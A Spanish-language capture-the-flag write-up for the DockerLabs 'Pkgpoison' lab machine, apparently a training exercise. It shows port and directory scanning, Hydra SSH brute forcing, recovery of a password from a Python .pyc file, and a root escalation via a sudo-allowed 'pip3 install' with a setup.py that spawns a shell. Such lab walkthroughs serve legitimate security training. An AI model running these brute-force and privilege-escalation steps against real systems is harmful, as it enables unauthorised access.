---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pkgpoison DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip pkgpoison.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh pkgpoison.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 10:35 EDT
Nmap scan report for thedog.dl (172.17.0.2)
Host is up (0.000060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:87:50:66:15:23:d6:c3:90:3f:ea:8c:a4:4b:b3:ff (RSA)
|   256 d1:35:c1:82:09:e8:c2:c7:cd:98:89:61:c2:6b:14:64 (ECDSA)
|_  256 dd:01:45:ce:bd:a3:05:21:5b:31:4c:2f:df:38:c4:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: 404 Not Found
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds
```

Veremos que hay un puerto `80` en el que esta alojada una pagina web, vamos a ver que tiene dicha pagina web al entrar, si entramos veremos simplemente una imagen, la cual no es nada interesante, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```
gobuster dir -u http://<IP> -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 589]
/notes                (Status: 200) [Size: 931]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hay un directorio llamado `/notes` vamos a ver que contiene:

```
URL = http://<IP>/notes
```

Si entramos dentro veremos un archivo llamado `note.txt` y si leemos que contiene pone lo siguiente:

```
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
```

Veremos que pone lo que parece las credenciales del usuario `dev`, si las probamos por `SSH` no veremos que nos deje, por lo que vamos a probar a realizar fuerza bruta, mediante el usuario `dev`, de esta forma:

## Escalate user dev

### Hydra

```shell
hydra -l dev -P <WORDLIST> ssh://<IP>/ -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-04 10:41:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: dev   password: computer
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 18 final worker threads did not complete until end.
[ERROR] 18 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-04 10:42:01
```

Veremos que nos ha encontrado las credenciale correctas, por lo que vamos a conectarnos por `SSH` de esta forma.

### SSH

```shell
ssh dev@<IP>
```

Metemos como contraseña `computer` y veremos que estamos dentro.

## Escalate user admin

Si listamos los usuarios que hay en el sistema de esta forma:

```shell
cat /etc/passwd | grep "/bin/bash"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
dev:x:1000:1000::/home/dev:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```

Veremos que hay otro usuario llamado `admin` vamos a ver con un `find` si hay algun archivo interesante bajo el usuario `admin` que nosotros podamos leer.

```shell
find / -user "admin" 2>/dev/null
```

Info:

```
/opt/scripts/__pycache__/secret.cpython-38.pyc
/home/admin
/home/admin/.profile
/home/admin/.bash_history
/home/admin/.bash_logout
/home/admin/.bashrc
```

Veremos varias cosas interesantes, entre ellas omitiendo la `/home` de dicho usuario, podremos ver un script muy interesante el cual vamos a leer a ver que contiene.

```python
U
�2h`�@s
       dd�ZdS)cCsd}d}td�dS)NZadminz
                                   p@$$w0r8321zAuthenticating...)�print)usernamepassword�r�     secret.py�authsrN)rrrrr<module>�
```

Vemos que nos lo da un poco raro, por lo que haremos esto:

```shell
strings /opt/scripts/__pycache__/secret.cpython-38.pyc
```

Info:

```
adminz
p@$$w0r8321z
Authenticating...)
print)
usernameZ
password
        secret.py
auth
<module>
```

Aqui ya podremos identificar una posible contraseña del usuario `admin` que seria la siguiente:

```
User: admin
Password: p@$$w0r8321
```

Vamos a probarla haciendo esto:

```shell
su admin
```

Metemos como contraseña `p@$$w0r8321` y veremos que estamos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for admin on cc0e0f1ace5f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on cc0e0f1ace5f:
    (ALL) NOPASSWD: /usr/bin/pip3 install *
```

Veremos que podemos ejecutar el binario `pip3` como el usuario `root` bajo cualquier archivo raiz, por lo que podremos realizar lo siguiente.

```shell
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF
```

Info:

```
# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que habremos terminado la maquina.
